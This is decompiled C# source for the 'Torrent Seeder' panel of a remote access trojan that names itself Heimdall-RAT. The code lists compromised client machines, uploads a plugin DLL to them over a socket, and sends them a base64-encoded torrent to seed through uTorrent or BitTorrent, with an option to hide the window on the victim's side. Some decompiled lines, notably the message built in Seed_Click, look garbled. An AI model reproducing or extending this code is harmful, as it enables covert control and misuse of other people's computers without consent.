using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ClientG.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class TSDGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("Clogs")]
	private ListView _Clogs;

	[AccessedThroughProperty("ColumnHeader1")]
	private ColumnHeader _ColumnHeader1;

	[AccessedThroughProperty("Clients")]
	private ListView _Clients;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("ColumnHeader2")]
	private ColumnHeader _ColumnHeader2;

	[AccessedThroughProperty("ColumnHeader3")]
	private ColumnHeader _ColumnHeader3;

	[AccessedThroughProperty("Seed")]
	private Button _Seed;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("SW")]
	private ComboBox _SW;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	public byte[] Bytes;

	public string FN;

	public int SelectedIndex;

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual ListView Clogs
	{
		[DebuggerNonUserCode]
		get
		{
			return _Clogs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Clogs = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader1 = value;
		}
	}

	internal virtual ListView Clients
	{
		[DebuggerNonUserCode]
		get
		{
			return _Clients;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Clients = value;
		}
	}

	internal virtual ImageList ImageList1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader3 = value;
		}
	}

	internal virtual Button Seed
	{
		[DebuggerNonUserCode]
		get
		{
			return _Seed;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Seed_Click;
			if (_Seed != null)
			{
				((Control)_Seed).remove_Click(eventHandler);
			}
			_Seed = value;
			if (_Seed != null)
			{
				((Control)_Seed).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual ComboBox SW
	{
		[DebuggerNonUserCode]
		get
		{
			return _SW;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_SW = value;
		}
	}

	internal virtual Panel Panel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel2 = value;
		}
	}

	internal virtual Panel Panel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel3 = value;
		}
	}

	[DebuggerNonUserCode]
	public TSDGR()
	{
		((Form)this).add_Load((EventHandler)TorrentSeeder_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_033e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0348: Expected O, but got Unknown
		//IL_0436: Unknown result type (might be due to invalid IL or missing references)
		//IL_0440: Expected O, but got Unknown
		//IL_0514: Unknown result type (might be due to invalid IL or missing references)
		//IL_051e: Expected O, but got Unknown
		//IL_06a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ac: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(TSDGR));
		Panel1 = new Panel();
		Seed = new Button();
		Label1 = new Label();
		SW = new ComboBox();
		Clogs = new ListView();
		ColumnHeader1 = new ColumnHeader();
		Clients = new ListView();
		ColumnHeader2 = new ColumnHeader();
		ColumnHeader3 = new ColumnHeader();
		ImageList1 = new ImageList(components);
		Panel2 = new Panel();
		Panel3 = new Panel();
		((Control)Panel1).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)Panel1).get_Controls().Add((Control)(object)Seed);
		((Control)Panel1).get_Controls().Add((Control)(object)Label1);
		((Control)Panel1).get_Controls().Add((Control)(object)SW);
		((Control)Panel1).set_Dock((DockStyle)2);
		Panel panel = Panel1;
		Point location = new Point(0, 546);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		Size size = new Size(1022, 38);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(0);
		((Control)Seed).set_Anchor((AnchorStyles)11);
		Button seed = Seed;
		location = new Point(935, 5);
		((Control)seed).set_Location(location);
		((Control)Seed).set_Name("Seed");
		Button seed2 = Seed;
		size = new Size(75, 23);
		((Control)seed2).set_Size(size);
		((Control)Seed).set_TabIndex(2);
		((ButtonBase)Seed).set_Text("Seed");
		((ButtonBase)Seed).set_UseVisualStyleBackColor(true);
		((Control)Label1).set_Anchor((AnchorStyles)7);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(12, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(60, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Seed with :");
		((Control)SW).set_Anchor((AnchorStyles)15);
		SW.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)SW).set_FormattingEnabled(true);
		SW.get_Items().AddRange(new object[3] { "Utorrent", "BitTorrent", "Both" });
		ComboBox sW = SW;
		location = new Point(78, 6);
		((Control)sW).set_Location(location);
		((Control)SW).set_Name("SW");
		ComboBox sW2 = SW;
		size = new Size(851, 21);
		((Control)sW2).set_Size(size);
		((Control)SW).set_TabIndex(0);
		((Control)Clogs).set_Anchor((AnchorStyles)15);
		Clogs.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[1] { ColumnHeader1 });
		((Control)Clogs).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Clogs.set_FullRowSelect(true);
		Clogs.set_GridLines(true);
		ListView clogs = Clogs;
		location = new Point(12, 3);
		((Control)clogs).set_Location(location);
		((Control)Clogs).set_Name("Clogs");
		ListView clogs2 = Clogs;
		size = new Size(998, 148);
		((Control)clogs2).set_Size(size);
		((Control)Clogs).set_TabIndex(1);
		Clogs.set_UseCompatibleStateImageBehavior(false);
		Clogs.set_View((View)1);
		ColumnHeader1.set_Text("Logs");
		ColumnHeader1.set_Width(766);
		((Control)Clients).set_Anchor((AnchorStyles)15);
		Clients.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader2, ColumnHeader3 });
		((Control)Clients).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Clients.set_FullRowSelect(true);
		Clients.set_GridLines(true);
		Clients.set_LargeImageList(ImageList1);
		ListView clients = Clients;
		location = new Point(12, 10);
		((Control)clients).set_Location(location);
		((Control)Clients).set_Name("Clients");
		ListView clients2 = Clients;
		size = new Size(998, 374);
		((Control)clients2).set_Size(size);
		Clients.set_SmallImageList(ImageList1);
		((Control)Clients).set_TabIndex(2);
		Clients.set_UseCompatibleStateImageBehavior(false);
		Clients.set_View((View)4);
		ColumnHeader2.set_Text("Clients");
		ColumnHeader3.set_Text("Exists");
		ImageList1.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream"));
		ImageList1.set_TransparentColor(Color.Transparent);
		ImageList1.get_Images().SetKeyName(0, "1486422417_desktop_computer.png");
		((Control)Panel2).get_Controls().Add((Control)(object)Clients);
		((Control)Panel2).set_Dock((DockStyle)5);
		Panel panel3 = Panel2;
		location = new Point(0, 0);
		((Control)panel3).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel4 = Panel2;
		size = new Size(1022, 546);
		((Control)panel4).set_Size(size);
		((Control)Panel2).set_TabIndex(3);
		((Control)Panel3).get_Controls().Add((Control)(object)Clogs);
		((Control)Panel3).set_Dock((DockStyle)2);
		Panel panel5 = Panel3;
		location = new Point(0, 389);
		((Control)panel5).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel6 = Panel3;
		size = new Size(1022, 157);
		((Control)panel6).set_Size(size);
		((Control)Panel3).set_TabIndex(4);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(1022, 584);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Panel3);
		((Control)this).get_Controls().Add((Control)(object)Panel2);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("TSD");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("TorrentSeeder");
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel3).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}

	private void TorrentSeeder_Load(object sender, EventArgs e)
	{
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		((Form)this).set_Text("Torrent Seeder | " + Environment.MachineName);
		if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\TS.dll"))
		{
			return;
		}
		((Form)this).set_TopMost(true);
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = MyProject.Forms.FrmMAINGR.listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					MyProject.Forms.FrmMAINGR.s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + MyProject.Forms.FrmMAINGR.Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\TS.dll")) + MyProject.Forms.FrmMAINGR.Key + val.get_ToolTipText() + MyProject.Forms.FrmMAINGR.Key + "True" + MyProject.Forms.FrmMAINGR.Key + "TS" + MyProject.Forms.FrmMAINGR.Key + "TS");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		((Form)this).set_TopMost(false);
	}

	private void Seed_Click(object sender, EventArgs e)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Invalid comparison between Unknown and I4
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		if (Operators.ConditionalCompareObjectEqual(SW.get_SelectedItem(), (object)null, false))
		{
			MessageBox.Show("You must select a client to seed your torrent!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		MsgBoxResult val = (MsgBoxResult)MessageBox.Show("Hide client window after seed?!", "Heimdall-RAT ", (MessageBoxButtons)4, (MessageBoxIcon)32);
		bool flag = (int)val == 6;
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		if (SW.get_SelectedIndex() == 0)
		{
			flag2 = true;
		}
		else if (SW.get_SelectedIndex() == 1)
		{
			flag3 = true;
		}
		else if (SW.get_SelectedIndex() == 2)
		{
			flag2 = true;
			flag3 = true;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Clients.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val2 = (ListViewItem)enumerator.Current;
					string[] array = Strings.Split(val2.get_SubItems().get_Item(1).get_Text(), " | ", -1, (CompareMethod)0);
					MyProject.Forms.FrmMAINGR.s.Send(Conversions.ToInteger(val2.get_ToolTipText()), Conversions.ToString(Conversions.ToDouble(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat("Seed Torrent" + MyProject.Forms.FrmMAINGR.Key, SelectedIndex.ToString()), MyProject.Forms.FrmMAINGR.Key), FN), MyProject.Forms.FrmMAINGR.Key), Convert.ToBase64String(Bytes)), MyProject.Forms.FrmMAINGR.Key)) + (double)(0 - (flag2 ? 1 : 0)) + Conversions.ToDouble(MyProject.Forms.FrmMAINGR.Key) + Conversions.ToDouble(array[0].Replace("uTorrent : ", "")) + Conversions.ToDouble(MyProject.Forms.FrmMAINGR.Key) + (double)(0 - (flag3 ? 1 : 0)) + Conversions.ToDouble(MyProject.Forms.FrmMAINGR.Key) + Conversions.ToDouble(array[1].Replace("BitTorrent : ", "")) + Conversions.ToDouble(MyProject.Forms.FrmMAINGR.Key) + (double)(0 - (flag ? 1 : 0))));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
